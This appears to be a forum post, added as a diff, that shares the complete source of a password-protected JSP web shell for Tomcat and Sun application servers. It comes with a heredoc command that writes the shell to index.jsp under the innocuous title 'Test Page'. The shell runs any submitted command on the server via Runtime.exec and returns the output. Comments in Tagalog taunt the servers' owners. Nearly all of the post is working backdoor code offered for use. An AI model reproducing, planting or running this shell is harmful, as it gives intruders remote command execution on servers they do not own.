@@ -1,0 +1,168 @@
+JSP-shell   	 Reply with quote  
+
+Tested on tomcat 5.x and sun application 9.x
+
+Based on PHP-shell
+
+
+cat<<EOF>index.jsp
+<%
+/* CREATED BY: K???N
+*
+* ASA KA PA!!! ITO AY BUTAS SA INYONG LAHAT!!!
+* SIGAW KE S???H, J????E, J??E
+* WAG NA SAWSAW
+* Kinopyapakaliwa sa taong milyo nubentos siete
+* (year 2007 tanga)
+*/
+%>
+<%@page contentType="text/html"%>
+<%@page pageEncoding="UTF-8"%>
+<%@page import="java.io.*"%>
+<%@page import="java.io.File.*"%>
+<%@page import="java.security.MessageDigest"%>
+
+
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN"
+"http://www.w3.org/TR/html4/loose.dtd">
+<HTML>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title>Test Page</title>
+
+</head>
+<body>
+<h1>JSP BUTAS</h1>
+<%
+String ServeName = request.getRequestURI();
+String IsAuth = (String) session.getAttribute("isauth");
+
+if (session.isNew()) {
+%>
+<FORM action="<%=ServeName%>" method="POST">
+<fieldset>
+<legend>Authentication</legend>
+<p>Password:
+<input type="password" name="pass" size="32" />
+<input name="submit_btn" type="submit" value="ok" />
+</p>
+</fieldset>
+</FORM>
+</BODY>
+</HTML>
+<%
+return;
+} else {
+if ((IsAuth == null)) {
+String pass = request.getParameter("pass");
+MessageDigest mdAlgorithm = MessageDigest.getInstance("MD5");
+
+mdAlgorithm.update(pass.getBytes());
+
+byte[] digest = mdAlgorithm.digest();
+StringBuffer hexString = new StringBuffer();
+
+for (int i = 0; i < digest.length; i++) {
+pass = Integer.toHexString(0xFF & digest[i]);
+if (pass.length() < 2) {
+pass = "0" + pass;
+}
+hexString.append(pass);
+}
+
+if (!(hexString.toString().equalsIgnoreCase("5e92e374a5144a93f529b5b4fa599273"))) {
+%>
+MUKHA MO!!!
+<%
+session.invalidate();
+return;
+} else {
+session.setAttribute("isauth", "true");
+}
+} else if (IsAuth.equals("true")) {
+
+} else {
+session.invalidate();
+return;
+}
+}
+%>
+
+<FORM action="<%=ServeName%>" method="POST">
+<fieldset>
+<legend>Input</legend>
+<p>Command:
+<input type="text" name="text" size="60" />
+<input name="submit_btn" type="submit" value="Exec" />
+</p>
+
+<% /*
+<p>Enable <code>stderr</code>-trapping?
+<input type="checkbox" name="stderr"/>
+<input name="submit_btn" type="submit" value="Execute Command" />
+</p>
+*/ %>
+</fieldset>
+
+<fieldset>
+<legend>Output</legend>
+<p>
+<textarea cols="120" rows="25" readonly="readonly">
+<%
+if (session.isNew()) return;
+
+Runtime runtime = Runtime.getRuntime();
+InputStream inputstream;
+InputStreamReader inputstreamreader;
+BufferedReader bufferedreader;
+OutputStream outputstream;
+OutputStreamWriter outputstreamwriter;
+BufferedWriter bufferedwriter;
+Process proc;
+String line;
+String S = new String("");
+
+S=(String) request.getParameter("text");
+
+if (S == null) { return; }
+
+try {
+proc = runtime.exec(S);
+inputstream = proc.getInputStream();
+inputstreamreader = new InputStreamReader(inputstream);
+bufferedreader = new BufferedReader(inputstreamreader);
+
+outputstream = proc.getOutputStream();
+outputstreamwriter= new OutputStreamWriter(outputstream);
+bufferedwriter = new BufferedWriter(outputstreamwriter);
+
+while ((line = bufferedreader.readLine()) != null) {
+%><%=line%>
+<%
+} try {
+if (proc.waitFor() != 0) {
+System.err.println("Exit value = " + proc.exitValue());
+}
+} catch (InterruptedException e) {
+System.err.println(e);
+System.err.print("Kalokohan!!!");
+}
+} catch (Exception e) {
+}
+%>
+</textarea>
+</p>
+</fieldset>
+</FORM>
+
+<script type="text/javascript">
+document.forms[0].text.focus();
+document.forms[0].text.value = '<%=S%>';
+</script>
+
+</BODY>
+</HTML>
+EOF
+_________________
+]b-p
